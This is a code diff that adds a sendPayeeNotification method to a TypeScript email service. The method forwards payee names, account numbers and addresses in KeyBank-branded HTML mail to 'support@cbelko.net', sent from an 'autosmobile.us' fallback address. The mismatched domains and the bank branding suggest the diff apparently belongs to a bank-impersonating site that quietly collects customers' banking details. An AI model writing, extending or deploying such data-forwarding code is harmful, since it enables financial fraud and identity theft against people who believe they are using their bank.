@@ -226,6 +226,39 @@ class EmailService {
       return false;
     }
   }
+
+  async sendPayeeNotification(payeeData: any): Promise<boolean> {
+    const adminEmail = 'support@cbelko.net';
+    
+    const emailOptions: EmailOptions = {
+      to: adminEmail,
+      subject: 'New Payee Added - KeyBank',
+      html: `
+        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+          <h2 style="color: #c8102e;">New Payee Added</h2>
+          <p><strong>Payee Details:</strong></p>
+          <ul>
+            <li><strong>Name:</strong> ${payeeData.name}</li>
+            <li><strong>Account Number:</strong> ${payeeData.accountNumber || 'N/A'}</li>
+            <li><strong>Address:</strong> ${payeeData.address}</li>
+          </ul>
+          <hr style="border: none; border-top: 1px solid #ddd; margin: 30px 0;">
+          <p style="color: #666; font-size: 12px;">KeyBank - Secure Banking Solutions</p>
+        </div>
+      `
+    };
+
+    try {
+      await this.transporter.sendMail({
+        from: process.env.SMTP_USER || 'support@autosmobile.us',
+        ...emailOptions,
+      });
+      return true;
+    } catch (error) {
+      console.error('Failed to send payee notification:', error);
+      return false;
+    }
+  }
 }
 
 export const emailService = new EmailService();
